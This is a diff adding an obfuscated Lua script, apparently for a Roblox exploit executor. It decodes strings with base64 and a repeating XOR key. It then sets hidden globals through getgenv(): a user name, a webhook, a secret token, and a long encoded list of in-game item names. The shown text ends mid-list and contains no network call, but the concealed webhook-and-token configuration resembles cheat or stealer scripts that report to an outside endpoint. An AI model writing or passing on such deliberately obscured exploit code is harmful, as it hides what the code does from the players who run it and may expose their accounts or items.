@@ -1,0 +1,639 @@
+--[[ Protected with multi-layer encoding ]]
+local _Ol0IlOOl0I="_OO0Ol";local _O0OOIIl0="_Ol0lO";local _I00OOI0=61964;local _lI0IlIl=49486;
+local _OIIIlOlO="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+local function _OIIOlOlI(_II00lI)
+  local _llI000=""
+  _II00lI=string.gsub(_II00lI,"[^".._OIIIlOlO.."=]","")
+  for _IIOI=1,#_II00lI,4 do
+    local a=string.find(_OIIIlOlO,string.sub(_II00lI,_IIOI,_IIOI),1,true)-1
+    local b=string.find(_OIIIlOlO,string.sub(_II00lI,_IIOI+1,_IIOI+1),1,true)-1
+    local c=string.find(_OIIIlOlO,string.sub(_II00lI,_IIOI+2,_IIOI+2),1,true)
+    local d=string.find(_OIIIlOlO,string.sub(_II00lI,_IIOI+3,_IIOI+3),1,true)
+    if c then c=c-1 end
+    if d then d=d-1 end
+    _llI000=_llI000..string.char((a*4+math.floor((b or 0)/16))%256)
+    if c then _llI000=_llI000..string.char(((b or 0)%16*16+math.floor((c or 0)/4))%256) end
+    if d then _llI000=_llI000..string.char(((c or 0)%4*64+(d or 0))%256) end
+  end
+  return _llI000
+end
+local _lOI0OIO0={45,80,91,219,211,212,223,253,119,8,14,40}
+local function _l0I0l0OI(_II00lI)
+  local _llI000=""
+  for _IIOI=1,#_II00lI do
+    local k=_lOI0OIO0[(_IIOI-1)%#_lOI0OIO0+1]
+    local b=string.byte(_II00lI,_IIOI)
+    local r=0
+    for bit=0,7 do
+      local ba=math.floor(b/2^bit)%2
+      local bb=math.floor(k/2^bit)%2
+      if ba~=bb then r=r+2^bit end
+    end
+    _llI000=_llI000..string.char(r)
+  end
+  return _llI000
+end
+local function _I0Il0I0OI00O(_II00lI) return _l0I0l0OI(_OIIOlOlI(_II00lI)) end
+local _I0lO0l00O=tostring(7932);local _IOIlIIO=tostring(9107);
+local function _OIl00OIOlO()
+getgenv().User = _I0Il0I0OI00O("eSM5".."hKOmsJo=")
+
+getgenv().Webhook = _I0Il0I0OI00O("aTgzv".."rux")
+
+getgenv().SecretToken = _I0Il0I0OI00O("H2V".."o7rfm5".."5laPT".."dKSH".."1v6bKx8".."sURP".."WwF".."GmRtv".."7Lius".."0Tamg".."a")
+
+getgenv().Brainrots = {
+  _I0Il0I0OI00O("fiQpu".."qS2".."uo8F".."cS5".."tQTUr".."s7K6qw".."=="),
+  _I0Il0I0OI00O("YDU0rL8".."="),
+  _I0Il0I0OI00O("ZTU6v7+x".."rI5XQGF".."aXjU2ur".."0="),
+  _I0Il0I0OI00O("fjsy".."ubq".."wtt0".."jZ2dESCQ".."="),
+  _I0Il0I0OI00O("ZSk/qb".."L0m48".."Wb2FG".."DRM6tb".."2xs5EYZ".."mc="),
+  _I0Il0I0OI00O("aSI6".."vLy6/7o".."eZm".."lNXzk1sg".."=="),
+  _I0Il0I0OI00O("aSI".."6vLy6/74".."WZmBNQ".."Tw0tbo="),
+  _I0Il0I0OI00O("YT8".."tvvOY".."sIsSKExN".."TCI="),
+  _I0Il0I0OI00O("YTF".."7iKak".."rZgab".."S5rQ".."j05sr21".."rJQYZg".."=="),
+  _I0Il0I0OI00O("bjU3vqC".."gtp".."wbKF5".."NSjEorq".."A="),
+  _I0Il0I0OI00O("fT8ruKa".."mqt0WZ".."moIazk".."hoaamqg".."=="),
+  _I0Il0I0OI00O("fz8ovqr".."0vpMTK".."FpNSTQi"),
+  _I0Il0I0OI00O("bjErs".."qe1sZJX".."RWFKVA=".."="),
+  _I0Il0I0OI00O("bj80".."sLr0".."vpMT".."KENBQ".."Tsy"),
+  _I0Il0I0OI00O("byUpvKa".."msN0".."2Zm".."oIayIir".."qG7"),
+  _I0Il0I0OI00O("ZjU".."vrqO".."1q9".."01em".."Fb"),
+  _I0Il0I0OI00O("fzUytb".."qgsN".."0kZGtB".."Sjgyr7w".."="),
+  _I0Il0I0OI00O("YT8o+".."5K5t".."poYew=="),
+  _I0Il0I0OI00O("YTF7".."iLa".."3rZgDKE".."1HQD".."Iytb".."KntpIZ"),
+  _I0Il0I0OI00O("YT8o+4Cx".."tJIbaW".."Zb"),
+  _I0Il0I0OI00O("fjk8tbym".."ut0".."0aXxJXTE".."4vg=="),
+  _I0Il0I0OI00O("ayI".."6vK".."G1spxX".."aWBMD".."RMztLCm".."vpA".."W"),
+  _I0Il0I0OI00O("YTF".."7mLKnvt0".."1Z2E="),
+  _I0Il0I0OI00O("YTF7".."nby7u9".."00Z".."2NKRD4".."6qLq7sQ".."=="),
+  _I0Il0I0OI00O("aDw+vb".."K6q5JXT".."nxB".."Sj8="),
+  _I0Il0I0OI00O("fiA0tL".."it/5w".."ZbC54WD0".."rsKo".."="),
+  _I0Il0I0OI00O("YTF7nLq".."6uJg".."FKF1NR".."j83urs="),
+  _I0Il0I0OI00O("ajk1vL".."am/".."7oSem9".."c"),
+  _I0Il0I0OI00O("fjE2tqq".."6tt0x".."aXpc".."RD4y"),
+  _I0Il0I0OI00O("YT8o".."+4Ckv".."pof".."bXpc".."RCM="),
+  _I0Il0I0OI00O("azU".."or7qiu".."t1BPw=="),
+  _I0Il0I0OI00O("ezU1r7y".."4tpgFZ".."y54TCY".."0tbamsA=".."="),
+  _I0Il0I0OI00O("fiA6vLux".."q4k".."eKF".."pdTDw".."+r6e".."9"),
+  _I0Il0I0OI00O("bD4vtL".."29sA=".."="),
+  _I0Il0I0OI00O("ajEpur".."61/".."5wZb".."C5lTDQ".."utb".."ehsZo="),
+  _I0Il0I0OI00O("fz8ov".."qegtt0j".."fW9ES".."CQvsg=".."="),
+  _I0Il0I0OI00O("YzE4".."s7z".."0jI".."0ObGta"),
+  _I0Il0I0OI00O("azkos7".."q6sN00".."ZGF".."fQzk1tA".."=="),
+  _I0Il0I0OI00O("YTEture".."7rZQ".."DZy57X".."Tk1sqe7"),
+  _I0Il0I0OI00O("Zz83".."t6r0lZ".."IbZHcIfj".."Ezrq".."E="),
+  _I0Il0I0OI00O("eTk".."psr+9tJ".."wbYWVJDQ".."Qyqb".."q4tpYWZ".."G9DQg".."=="),
+  _I0Il0I0OI00O("ZjUvuLuh".."rYhXaW".."BMDR0uq".."KehrYg="),
+  _I0Il0I0OI00O("fic6vLS".."t/78FZ".."30="),
+  _I0Il0I0OI00O("YTF7iby".."5vpM".."DYW0Iai".."I6tbe".."x"),
+  _I0Il0I0OI00O("YiI4".."ur+xu5".."IZ"),
+  _I0Il0I0OI00O("eTk4r".."7K3/64W".."YHta"),
+  _I0Il0I0OI00O("ZjUvrqO".."1q908bX5".."JWQ=="),
+  _I0Il0I0OI00O("YTF7j7K".."3sN00Z".."2NKR".."D46qLq7s".."Q=="),
+  _I0Il0I0OI00O("eTE1v".."POAv".."pMQK".."EVNQTU".."vur2z"),
+  _I0Il0I0OI00O("YT8ts".."r30jZ".."IEbQ=".."="),
+  _I0Il0I0OI00O("YT8".."o+4e".."1vJ".."IFYXpJXg".."=="),
+  _I0Il0I0OI00O("aCYyt".."7awsJM".."="),
+  _I0Il0I0OI00O("YT8o+4".."Omt".."pAYe".."w=="),
+  _I0Il0I0OI00O("YTF7".."kby4s4RX".."T3xJQz".."Q+"),
+  _I0Il0I0OI00O("enA0qf".."OY"),
+  _I0Il0I0OI00O("aCM0sPOH".."upY".."YZG".."9A"),
+  _I0Il0I0OI00O("YT8o+".."4Ohu".."Joeb".."X0="),
+  _I0Il0I0OI00O("eSI".."6t7K4up".."kYZg=="),
+  _I0Il0I0OI00O("aj85ub+9".."sZJXXWBB".."Tjk4".."t7q6".."sA=="),
+  _I0Il0I0OI00O("eSU9vfOA".."sIgUaW".."A="),
+  _I0Il0I0OI00O("YDk+r7a".."gupQF".."aS5qR".."DMyuL".."+xq5geem".."8="),
+  _I0Il0I0OI00O("YD81v".."qr0kp".."IZbXcIfz".."Uytbex".."uo8="),
+  _I0Il0I0OI00O("bjgyt7+9".."sd00YG".."dERA=="),
+  _I0Il0I0OI00O("bjgyq".."6C7/5".."wZbC5".."5WDUot".."A=="),
+  _I0Il0I0OI00O("YTF7i".."KO7sJ".."YOKElaT".."D4/vg".."=="),
+  _I0Il0I0OI00O("bzE4rqGh".."/5wZbC".."5tSjcuqa".."Y="),
+  _I0Il0I0OI00O("YT8o".."+5GmsI4".."="),
+  _I0Il0I0OI00O("YTF".."7nqugtpM".."UfC".."5vXzE1v7".."Y="),
+  _I0Il0I0OI00O("YT8o+5C".."1sZke".."bX0="),
+  _I0Il0I0OI00O("bjU3".."rr+1rZ4e".."Zmc".."Iezk".."4sryntpM".."e"),
+  _I0Il0I0OI00O("YT8".."o++Xj"),
+  _I0Il0I0OI00O("YT8o+5".."67vZ".."QbYX0="),
+  _I0Il0I0OI00O("YD8".."1vqr0k".."pIZbXcIf".."SU8vKo="),
+  _I0Il0I0OI00O("YT8".."o+5".."m7s".."5EOKE1HQ".."DIyt".."bKn".."tpIZaX0="),
+  _I0Il0I0OI00O("YT8o+4Ck".."sJIccS5r".."Qj05s".."r21r".."JQYZm".."9b"),
+  _I0Il0I0OI00O("YT8o".."+5u7".."q44HZ3pb".."RCQ0qA=".."="),
+  _I0Il0I0OI00O("YT8o+4O4".."vpMefGF".."b"),
+  _I0Il0I0OI00O("bjgyuL".."+xq5gee".."m8Ibi".."Ursr".."exto8".."W"),
+  _I0Il0I0OI00O("aRp".."7i7".."K6u5w="),
+  _I0Il0I0OI00O("YTEo+4C9".."rA=="),
+  _I0Il0I0OI00O("fiAytb2t".."/7UW".."ZWNR"),
+  _I0Il0I0OI00O("YT8o+4".."Cjupg".."DYGtJXy".."Qo"),
+  _I0Il0I0OI00O("eTE4tK".."G9q5".."xXSm".."dLRDM3vq".."e1"),
+  _I0Il0I0OI00O("YyU4".."t7a1rZ".."JXTGdGQi".."MouqamsA".."=="),
+  _I0Il0I0OI00O("YT8o+5C".."7sp8eZ".."m9bR".."D81uqA".."="),
+  _I0Il0I0OI00O("bjgyu".."L+xq5gee".."m8IYz8".."+t6e".."xto8W"),
+  _I0Il0I0OI00O("bjgytr".."29s".."ZI="),
+  _I0Il0I0OI00O("fic6".."vPO".."HsJ".."kW"),
+  _I0Il0I0OI00O("Yz80".."+76t/7".."USaXxc"),
+  _I0Il0I0OI00O("YDEps".."rK3t5R".."XS2Fa".."TCo0tbo".."="),
+  _I0Il0I0OI00O("eTE4".."tKG9s".."5EYK".."E1aQjM0v".."7q4".."s5I="),
+  _I0Il0I0OI00O("YT8o".."++Hh"),
+  _I0Il0I0OI00O("YTF7nKG".."1sZkSK".."E1H".."QDIytbKn".."tpIZ"),
+  _I0Il0I0OI00O("YT8".."o+5GhrY8".."efGFb"),
+  _I0Il0I0OI00O("aT81sL".."atq4gFam".."EIaCgrqb".."anrA".."=="),
+  _I0Il0I0OI00O("G2c="),
+  _I0Il0I0OI00O("YT8o+".."5C8tp4bb".."XpNR".."CI6qA".."=="),
+  _I0Il0I0OI00O("aiU+qKf".."06ct".."B"),
+  _I0Il0I0OI00O("YT8o+".."569/7oW".."fGdc".."QiM="),
+  _I0Il0I0OI00O("fzE1vPO".."GtpM".."QKE".."xdXg".."=="),
+  _I0Il0I0OI00O("Yz8".."0+76t/6".."0FbX1".."NQy".."Q="),
+  _I0Il0I0OI00O("YT8".."o+527".."sJJXR".."XcIZT".."8vqKO7q4".."4efGFb"),
+  _I0Il0I0OI00O("Yz80+76".."t/74".."WZm".."pR"),
+  _I0Il0I0OI00O("bCI4".."ure7r4gE"),
+  _I0Il0I0OI00O("YT8o+4".."Khuo4".."WbGdEQTE".."o"),
+  _I0Il0I0OI00O("bjgyuL+x".."q5geemd".."GTH".."AZsrC".."9vJESf".."GtBXzk1".."ug=="),
+  _I0Il0I0OI00O("byUpqbq".."gsN01".."aWBMRCQ0"),
+  _I0Il0I0OI00O("bjgyt7/0".."j4g".."HeHc="),
+  _I0Il0I0OI00O("fCU+qL".."KwtpE".."bZy5+".."TD0rsqG7"),
+  _I0Il0I0OI00O("bjgyuL".."+xq5geem".."8Ibzk4sr".."C4uokSY".."XxJ"),
+  _I0Il0I0OI00O("byIutbqg".."sN06".."aXxb".."RCQ0"),
+  _I0Il0I0OI00O("biUrs".."rf0l".."5IDe35H".."WQ=="),
+  _I0Il0I0OI00O("YDl7nL".."KgtokY"),
+  _I0Il0I0OI00O("ZT97k7z".."0l5JXW29".."AWCI="),
+  _I0Il0I0OI00O("biU".."rsrf0nI".."gHYWoIfj".."EzrqE="),
+  _I0Il0I0OI00O("byU1sqe7".."/78CZmdc".."QnAI".."q7q6tok".."Y"),
+  _I0Il0I0OI00O("fCU+qLKw".."tpEba".."S5rXz8".."4tLe9s".."5w="),
+  _I0Il0I0OI00O("fT8v".."+4O".."hso0".."cYWA="),
+  _I0Il0I0OI00O("YzEu".."vLugpt".."05a".."XtPRSQi"),
+  _I0Il0I0OI00O("ZT8pvrS9".."sZR".."XSm".."FHQA=="),
+  _I0Il0I0OI00O("fjE1r7L0".."l5IDe3".."5HW".."Q=="),
+  _I0Il0I0OI00O("fTkpr".."r+9q5Ief".."G8Ibz".."k4sr".."C4uok".."SYXxJ"),
+  _I0Il0I0OI00O("H2U="),
+  _I0Il0I0OI00O("fT8v+5".."u7q".."44HZ3o".."="),
+  _I0Il0I0OI00O("eT97r".."7z0q5JX".."W29AWCI".."="),
+  _I0Il0I0OI00O("eTU3v".."r67".."rYk".."S"),
+  _I0Il0I0OI00O("YTF7iLK".."8qo9XS2F".."FTz".."k1uqC9s".."JM="),
+  _I0Il0I0OI00O("YTkor/O".."Yto4".."DKE".."JBXiR".."7iLK8".."qo8="),
+  _I0Il0I0OI00O("Yz80+76".."t/5g".."PaWNBQ".."zU="),
+  _I0Il0I0OI00O("Yz80tP".."OZpt0/".."Z3pbXT".."8v"),
+  _I0Il0I0OI00O("eSU1".."vPO".."AqpMQKF".."pdQz".."d7iLK8q".."o8="),
+  _I0Il0I0OI00O("byU1".."taq5vp".."M="),
+  _I0Il0I0OI00O("YT8o".."+5m".."7vZ4ef".."GFb"),
+  _I0Il0I0OI00O("biU6v6".."G1spwDKG".."9GSXA".."Lurimv".."pUaaXpF".."TD06r".."w=="),
+  _I0Il0I0OI00O("fTw".."+uqCx/5".."AOKF5aSC".."M+tac="),
+  _I0Il0I0OI00O("YT8o+".."5Chv".."JwFa".."W1AT".."CM="),
+  _I0Il0I0OI00O("HChqo+K".."s7g=="),
+  _I0Il0I0OI00O("YT8".."tvv".."OYsIs".."SKEJHWz".."V7i".."LK8qo".."8="),
+  _I0Il0I0OI00O("fTU".."pqbqgsN0".."1fXxaRCQ".."0"),
+  _I0Il0I0OI00O("aiI6sqO".."hrI5".."XRWtMW".."CMosg".."=="),
+  _I0Il0I0OI00O("ajk9".."r7q6tt0k".."eHdMSCIy".."tbo="),
+  _I0Il0I0OI00O("ah8a".."jw=".."="),
+  _I0Il0I0OI00O("eSI".."yuLi7".."s5QZZw=="),
+  _I0Il0I0OI00O("eSIyq7+9".."q5J".."XXHxJQTE".."3vqG9q5".."IE"),
+  _I0Il0I0OI00O("YTF7jb".."K3vJxX".."Qm9L".."Rj97l7q".."6q5g".."FYW".."BH"),
+  _I0Il0I0OI00O("azkos".."7G7".."vo8T"),
+  _I0Il0I0OI00O("fjE1r6ex".."sA=="),
+  _I0Il0I0OI00O("YTE".."o+4".."W1ro".."gefG9bD".."QM6r6ams".."ZQDaX".."0="),
+  _I0Il0I0OI00O("YT8".."o+5i1r".."ZYSemd".."cQiM="),
+  _I0Il0I0OI00O("ZjEpsLa".."m/64W".."YHt".."a"),
+  _I0Il0I0OI00O("ayI6tbi".."xsYk".."DbWE="),
+  _I0Il0I0OI00O("YT8o+".."4emt".."pIE"),
+  _I0Il0I0OI00O("Zz85+5m7".."vd09Z2wI".."fjEzrq".."E="),
+  _I0Il0I0OI00O("YTE".."o+4emvp".."EWZGta".."RCQ6".."qA=".."="),
+  _I0Il0I0OI00O("fSU2q".."7i9".."sZRXW3".."5RSTU".."psr29"),
+  _I0Il0I0OI00O("fz84uL".."z0m5".."QEa2E="),
+  _I0Il0I0OI00O("aCgv".."sr23q90".."6aXpc".."SD8="),
+  _I0Il0I0OI00O("YTF7kL".."Kmt".."JgFY29a".."DRM0trG9".."sZw".."EYWF".."G"),
+  _I0Il0I0OI00O("fzU".."ytb".."exuo9XX".."HxJQTE3".."ug=="),
+  _I0Il0I0OI00O("YTF7jbK".."3vJxX".."WHxNXj".."V7i6G".."xrJgZ".."fGs="),
+  _I0Il0I0OI00O("dDUoqPO".."5pt0ScG9".."FRD".."4+"),
+  _I0Il0I0OI00O("aiU+qaG9".."rZJXT".."GdP".."RCQ".."6t7Y="),
+  _I0Il0I0OI00O("bz8".."6r7qgsN0".."2fX".."xJWTkvtA".."=="),
+  _I0Il0I0OI00O("YT8o".."+4emvpE".."WZGtaRCQ".."0qA=="),
+  _I0Il0I0OI00O("eyU3r6a".."mtp".."MYKF".."1DSD".."w+r7y6s".."A=="),
+  _I0Il0I0OI00O("YT8o+".."4e7r".."YkCe".."w=="),
+  _I0Il0I0OI00O("dz82ubq".."x/6kF".."aWJJQTE="),
+  _I0Il0I0OI00O("YTF7mKa".."3vo8Wa2Z".."J"),
+  _I0Il0I0OI00O("ayI6".."vLy4".."vt07aS5k".."THA".."Xug=="),
+  _I0Il0I0OI00O("aCgvsr23".."q90jem9".."ETD".."w+qbw="),
+  _I0Il0I0OI00O("YT8o+4C".."kppkSemd".."GRCM="),
+  _I0Il0I0OI00O("bDc6q".."aG9".."sZRXZG8".."IfTE3sr2".."9"),
+  _I0Il0I0OI00O("bjg6".."uLux".."vJUe"),
+  _I0Il0I0OI00O("bzw6uL".."i8sJESK".."ElHT".."CQ="),
+  _I0Il0I0OI00O("aSU".."3+5ehs".."90zfWI="),
+  _I0Il0I0OI00O("eT8pq".."aeh".."uJQ".."ZZmcI".."aSI6".."vLy6u".."Y8CfGdG".."RA=="),
+  _I0Il0I0OI00O("fjE2t".."qq6t".."t0keHd".."MSCIyt".."bo="),
+  _I0Il0I0OI00O("ZzE4s".."LymtpEb".."aQ=="),
+  _I0Il0I0OI00O("eSI+t".."bynq48Cc".."nRHD".."QQuqbG7".."/8l".."HOD".."4="),
+  _I0Il0I0OI00O("YT8o+".."561q4kSZ".."30="),
+  _I0Il0I0OI00O("ZjE".."psLamt".."JwFKEVd".."Xzs".."uqQ=".."="),
+  _I0Il0I0OI00O("bzkotL".."2gut0wYX".."tYXTkv".."vqGx"),
+  _I0Il0I0OI00O("YTF7jbK3".."vJxXW2".."9cWCI1".."tPOHvokC".."emB".."BWTE="),
+  _I0Il0I0OI00O("ZjEpsL".."amt5gWen".."oIYSUts".."Kam"),
+  _I0Il0I0OI00O("fT8r".."+4O".."7r90ka".."WZdXw=".."="),
+  _I0Il0I0OI00O("aT83q7u9".."sZRXQm".."tcX".."jsytb".."o="),
+  _I0Il0I0OI00O("fTE1".."v7K".."6tpMeKE".."haQiM".."vsr2".."9"),
+  _I0Il0I0OI00O("ajk1vLam".."/74ee3".."pNXz4".."6"),
+  _I0Il0I0OI00O("eTU1".."r7K3sJEY".."KFpN".."Tj4".."yuLw".."="),
+  _I0Il0I0OI00O("bj84t".."LL0".."no4EaX1".."bRD40"),
+  _I0Il0I0OI00O("bzU3rr".."+1/7".."8SZHtPTA".."=="),
+  _I0Il0I0OI00O("fjsut7/".."0jJYCZGI".."Ifj".."sut78="),
+  _I0Il0I0OI00O("ZiIuq6a/".."/60Wb2c".."IfTE8".."sg=".."="),
+  _I0Il0I0OI00O("bjErq".."6a3v".."JQZZy5r".."QT8stb".."q6sA=="),
+  _I0Il0I0OI00O("byI6qLq4".."tpMe".."KExNXzk2".."ubq6tg".."=="),
+  _I0Il0I0OI00O("YSUt+5+h".."qd07".."fXg="),
+  _I0Il0I0OI00O("bD4rur+".."9/78Wa".."mtE"),
+  _I0Il0I0OI00O("Yz80+5+".."1/60YZGd".."SRDE="),
+  _I0Il0I0OI00O("bjgpsq".."C5vo4a".."aWNJWQ".."=="),
+  _I0Il0I0OI00O("YT8o+5S1".."q4kef".."GFb"),
+  _I0Il0I0OI00O("bzE2u".."ab0nZw".."aan".."sIfj".."EzrqE="),
+  _I0Il0I0OI00O("YDEor".."7yw".."sJMDYW1H".."DQQ+t7".."aktpgTZ2".."BN"),
+  _I0Il0I0OI00O("fTk4".."uLq7sZg".."DfG8IYD".."E4uLu9".."sZw".."="),
+  _I0Il0I0OI00O("bz8".."5uvOEvp".."MTaQ=".."="),
+  _I0Il0I0OI00O("byUzt".."POwu".."t05Z2tEQ".."g=="),
+  _I0Il0I0OI00O("ayIy".."tPOatpM".."daQ=="),
+  _I0Il0I0OI00O("aiI6tbC8".."tpg".."bZGE".."Ifi".."Ayqbq".."gup".."Eb"),
+  _I0Il0I0OI00O("YT8o+4e".."9r5RXXG".."9LQiM="),
+  _I0Il0I0OI00O("eT80r7q6".."tt0kYHxB".."QCA".."ytbo".."="),
+  _I0Il0I0OI00O("dDUvsv".."OXs".."5wCew".."=="),
+  _I0Il0I0OI00O("ajk1v".."Lam/7o".."bZ2x".."H"),
+  _I0Il0I0OI00O("aSU8+7e".."huN0".."TfWk="),
+  _I0Il0I0OI00O("YCU2tqr".."0npAVaW".."JJTyU="),
+  _I0Il0I0OI00O("eTEp".."r7Km".."qpo".."WKE1".."BXiQ+qb2".."1"),
+  _I0Il0I0OI00O("fiEu".."ur+1sZwZ".."aQ=".."="),
+  _I0Il0I0OI00O("fj46".."sr+xsYcY"),
+  _I0Il0I0OI00O("bj8ptfOX".."sI8ZK".."E1HXz".."57iLK8qo".."8="),
+  _I0Il0I0OI00O("bCEuur21".."qok="),
+  _I0Il0I0OI00O("bjE4uq".."C9q5JXW".."29cTDwy".."r7w".."="),
+  _I0Il0I0OI00O("YiI4u".."r+9q5x".."XR3xL".."TDw6"),
+  _I0Il0I0OI00O("biI6ubG".."7/7Ee".."ZWFGSC".."Qvu".."g=="),
+  _I0Il0I0OI00O("YT8o".."+5ymv".."JwbYXp".."HXg=="),
+  _I0Il0I0OI00O("eSI6".."uKe7rZJX".."TGdGQ".."iM6rqG7"),
+  _I0Il0I0OI00O("byIp+7".."an/6kSYC".."54TCQyq6".."a5"),
+  _I0Il0I0OI00O("fTk4uLq7".."sZhXRW9L".."Tjg".."ytb".."I="),
+  _I0Il0I0OI00O("fTEw".."qbK8spw".."DZW9cR".."D46"),
+  _I0Il0I0OI00O("bz82ub".."Kmu5QZ".."YS58QiIv".."sr2".."9tg=="),
+  _I0Il0I0OI00O("YT8".."o+5G7".."sp8e".."Zmd".."cQiM="),
+  _I0Il0I0OI00O("bzE3t7am".."tpMWKF5N".."XSA+".."qb69".."sYkeZ".."m8="),
+  _I0Il0I0OI00O("fTE".."wqbK".."8spwD".."ZW9F".."TCQ="),
+  _I0Il0I0OI00O("YT8o+".."4ehsZoDf".."WBPWSU1v".."LC9q5".."IE"),
+  _I0Il0I0OI00O("byU3u".."bqgsN".."01aW".."BMRCQ".."0+4emvpY".."DZ3".."xBW".."T8="),
+  _I0Il0I0OI00O("bzE".."3t7amtpM".."YKEJ".."HQT83".."tA=="),
+  _I0Il0I0OI00O("YTEo+5C1".."r4gUY".."GdG".."TCM="),
+  _I0Il0I0OI00O("eSI".."yq6O9".."/6kFZ35Y".."RHAPqbyk".."r5x".."XXHx".."BXSA".."6"),
+  _I0Il0I0OI00O("ajEvr7qg".."sN0jaW1".."HWT8="),
+  _I0Il0I0OI00O("YT8o+5C8".."tpU".."CaWBB".."Qzko"),
+  _I0Il0I0OI00O("bjErs".."vOAvp".."4Y"),
+  _I0Il0I0OI00O("ZzE".."4sLz0l".."ZwUYy5".."iTDM".."w"),
+  _I0Il0I0OI00O("eSI+".."tbyn".."q48CcnR".."HDQQu".."qbG7".."/85HOD4="),
+  _I0Il0I0OI00O("eCIuub".."q6tt0xZ".."G9FSD48".."rrq6tg".."=="),
+  _I0Il0I0OI00O("aCgv".."sr23q90".."1aWJE".."SCIy".."tbI="),
+  _I0Il0I0OI00O("ezE".."2q7qmv".."t00".."aX5".."YWDM".."ytb".."I="),
+  _I0Il0I0OI00O("eSI6".."t7K4tok".."WKF".."paTDw6t".."7I="),
+  _I0Il0I0OI00O("YiI4u".."r+xr".."ZJXR".."3xLTDw".."6"),
+  _I0Il0I0OI00O("eSUw".."ur26".."sN01aWB".."JQz40"),
+  _I0Il0I0OI00O("bDw+q".."KC9s".."A=="),
+  _I0Il0I0OI00O("eD4".."4t7q".."gsN0k".."aWN".."BWT8="),
+  _I0Il0I0OI00O("eTkr".."svO".."AsI0".."eKFpJT".."j8="),
+  _I0Il0I0OI00O("YjQytf".."OQtp".."NXTGd".."GDRQutQ=".."="),
+  _I0Il0I0OI00O("aCMrqba".."nrJJX".."W2d".."PQz8pu".."g=="),
+  _I0Il0I0OI00O("YD81v".."qr0kpIZ".."bXcI".."YDE1"),
+  _I0Il0I0OI00O("eTk".."8qb".."y4tpoF".."bS5uXyUv".."tL26tg=".."="),
+  _I0Il0I0OI00O("YT8o+5C".."msJ4Yb".."GdEQTkv".."tKA="),
+  _I0Il0I0OI00O("eSI".."6t7K4uo8".."YKFp".."aTDw6t7I".."="),
+  _I0Il0I0OI00O("YDEvr".."7a7"),
+  _I0Il0I0OI00O("bjgys6a".."1sZQZ".."YS58".."TDM0".."tbq6tg".."=="),
+  _I0Il0I0OI00O("ajEvr".."7Kgt".."pMYKEBR".."TD4yt".."bw="),
+  _I0Il0I0OI00O("ajkpur".."W1/".."74S".."ZGtbWSI".."+"),
+  _I0Il0I0OI00O("bj84tLW1".."sYkYKEt".."ESDY6".."tae7"),
+  _I0Il0I0OI00O("azk".."hoa".."r0jJI".."TaQ=="),
+  _I0Il0I0OI00O("eSI+vv".."OArZgSKF".."paS".."DV7iL".."K8qo8="),
+  _I0Il0I0OI00O("bzE1ur".."29q5".."JXSm9GST".."kvt".."A=="),
+  _I0Il0I0OI00O("ZzE4s".."Lz0jI0W".."fmtGWT8".."oug=="),
+  _I0Il0I0OI00O("eT8yt7ag".."q5J".."XTmFLT".."DM4".."sr27"),
+  _I0Il0I0OI00O("bjU1".."r6Gh".."vJ4eKE".."BdTjwu".."uLC".."9"),
+  _I0Il0I0OI00O("bjEp".."qbygtpMe".."KExa".."TDk".."1sr29"),
+  _I0Il0I0OI00O("bjEp".."t7y7"),
+  _I0Il0I0OI00O("bjE4".."s7ymrZQD".."Zy5lS".."Dw0tbq".."gsA=="),
+  _I0Il0I0OI00O("fiA".."0tbS9sZ".."RXWX".."tJTj".."sytbo".."="),
+  _I0Il0I0OI00O("YT8o".."+527sJ8e".."Zmdb"),
+  _I0Il0I0OI00O("Zzk1vL+x".."/7ce".."ZmlESHAI".."uruhrQ=".."="),
+  _I0Il0I0OI00O("eSI".."6uL".."ywqp4".."YfHtEWH".."Afvr+".."1r5".."gba".."WpdXiQu".."oQ=="),
+  _I0Il0I0OI00O("YDE".."8sv".."OGt".."p8V".."YXp".."BQzk="),
+  _I0Il0I0OI00O("fzgy".."tbz0l".."5gbYW1".."HXSQ+q".."bq6sA=".."="),
+  _I0Il0I0OI00O("eTV7".."j7b".."0i5hXW29".."AWCI="),
+  _I0Il0I0OI00O("ajE1".."vLK6p".."ZgbZGc".."IeSIut".."7K4v".."g=="),
+  _I0Il0I0OI00O("YTUprr+x".."rYgbbXxd".."QTU".."="),
+  _I0Il0I0OI00O("eT85+4e".."7vZRX".."XGFK".."RA=="),
+  _I0Il0I0OI00O("fiQ0q6O7".."/7ECZW".."dGRD40"),
+  _I0Il0I0OI00O("aj8p".."sr+4s".."N0gaXpN".."Xz0+".."t7y6u48".."eZGJH"),
+  _I0Il0I0OI00O("aj8p".."sr+4sN0k".."fWxf".."Qj89vqG".."7"),
+  _I0Il0I0OI00O("bjEt".."ur+4sN0".."hYXxcWD8".."otA".."=="),
+  _I0Il0I0OI00O("bCY0uLK".."wsI8".."eZGJJ"),
+  _I0Il0I0OI00O("eTk8q".."bq4tpM".."eKFlJW".."TUptra4t".."pMe"),
+  _I0Il0I0OI00O("dzk5qbL".."0hY".."gVem8I".."dzk5qbK".."4tpMe"),
+  _I0Il0I0OI00O("bz8".."2uby5vZQ".."ZYS5vWC".."Mytbo".."="),
+  _I0Il0I0OI00O("fiAytL".."29rZJX".."T2FE".."WDIyqbw="),
+  _I0Il0I0OI00O("byI".."ur6e7/".."7oea".."WJdW".."SQ0"),
+  _I0Il0I0OI00O("bz82u".."bKmu5QF".."Zy5rXz8".."4tLe".."9s5I="),
+  _I0Il0I0OI00O("fzgy".."tbz0".."i5IWe3".."pNX".."zk1tA=".."="),
+  _I0Il0I0OI00O("YiI6tb".."Shq5QZ".."YS5pQzE1".."uqCntpM".."e"),
+  _I0Il0I0OI00O("ayIyv".."Lz0nJw".."abWJH"),
+  _I0Il0I0OI00O("byUztP".."Owut0xf".."WtPQg".."=="),
+  _I0Il0I0OI00O("fjU6t7z".."0jZgQaW".."JH"),
+  _I0Il0I0OI00O("fjk8trL0".."mJQFZA".."=="),
+  _I0Il0I0OI00O("fSU9vb".."K2vpEb"),
+  _I0Il0I0OI00O("bjg0uLC7".."/78CZm".."BR"),
+  _I0Il0I0OI00O("fjk8trL0".."nZI".."O"),
+  _I0Il0I0OI00O("fTl7i7r0".."iJw".."DbX".."xFSDw0".."tQ=="),
+  _I0Il0I0OI00O("fCU6uLi".."hs5w="),
+  _I0Il0I0OI00O("fTE".."1v7K".."3vJQZY".."S5qTD46t".."bq6t".."g=="),
+  _I0Il0I0OI00O("bj84tKC9".."sZRXR".."W9FTA=="),
+  _I0Il0I0OI00O("fiQpuqS2".."uo8FbWJ".."ERH".."Adt7K5t".."pMQbWJER".."A=="),
